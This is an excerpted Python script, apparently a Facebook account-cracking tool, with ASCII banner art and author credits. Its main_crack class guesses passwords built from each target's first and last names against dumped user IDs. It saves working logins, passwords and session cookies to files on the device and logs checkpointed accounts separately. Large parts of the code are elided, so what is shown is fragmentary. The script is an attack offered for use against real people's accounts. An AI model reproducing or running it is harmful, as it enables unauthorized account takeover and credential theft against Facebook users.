#!/usr/bin/python
#Original written By Aung Phyo Thant
...
\033[1;32m RRRRRRRRRRRRRRRRR   YYYYYYY       YYYYYYY           AAA               NNNNNNNN        NNNNNNNN
\033[1;32m R::::::::::::::::R  Y:::::Y       Y:::::Y          A:::A              N:::::::N       N::::::N
\033[1;32m R::::::RRRRRR:::::R Y:::::Y       Y:::::Y         A:::::A             N::::::::N      N::::::N
\033[1;32m RR:::::R     R:::::RY::::::Y     Y::::::Y        A:::::::A            N:::::::::N     N::::::N
\033[1;32m   R::::R     R:::::RYYY:::::Y   Y:::::YYY       A:::::::::A           N::::::::::N    N::::::N
\033[1;32m   R::::R     R:::::R   Y:::::Y Y:::::Y         A:::::A:::::A          N:::::::::::N   N::::::N
\033[1;32m   R::::RRRRRR:::::R     Y:::::Y:::::Y         A:::::A A:::::A         N:::::::N::::N  N::::::N
\033[1;32m   R:::::::::::::RR       Y:::::::::Y         A:::::A   A:::::A        N::::::N N::::N N::::::N
\033[1;32m   R::::RRRRRR:::::R       Y:::::::Y         A:::::A     A:::::A       N::::::N  N::::N:::::::N
\033[1;32m   R::::R     R:::::R       Y:::::Y         A:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::N
\033[1;32m   R::::R     R:::::R       Y:::::Y        A:::::::::::::::::::::A     N::::::N    N::::::::::N
\033[1;32m   R::::R     R:::::R       Y:::::Y       A:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N
\033[1;32m RR:::::R     R:::::R       Y:::::Y      A:::::A             A:::::A   N::::::N      N::::::::N
\033[1;32m R::::::R     R:::::R    YYYY:::::YYYY  A:::::A               A:::::A  N::::::N       N:::::::N
\033[1;32m R::::::R     R:::::R    Y:::::::::::Y A:::::A                 A:::::A N::::::N        N::::::N
\033[1;32m RRRRRRRR     RRRRRRR    YYYYYYYYYYYYYAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN

\033[1;95m------------------------------------------------
\033[1;95m Owner   :            Aung Phyo Thant
\033[1;96m Facebook:            Aung Phyo Thant
\033[1;96m Github  :            Ryan
\033[1;95m Version :            1.2
\033[1;95m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Ryan Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/Aung.Phyo.Thant.Technology')
        pass
    elif select =='F':
        os.system('xdg-open https://m.me/Aung.Phyo.Thant.Technology')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m {S}[RY] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [RYAN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RYAN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RYAN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [RYAN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/RYAN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RYAN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
    ...
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)
            print(f'{S} \033[;32mEXAMPLE: first123,last1122,firstlast,last,ETC')
            print('')
            if sl =='':
            ...
            print(f'{S} \033[1.;32mRYAN IS COMMING ...')
            print(47*"-")
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/RY.txt') 
        print(47*"-")
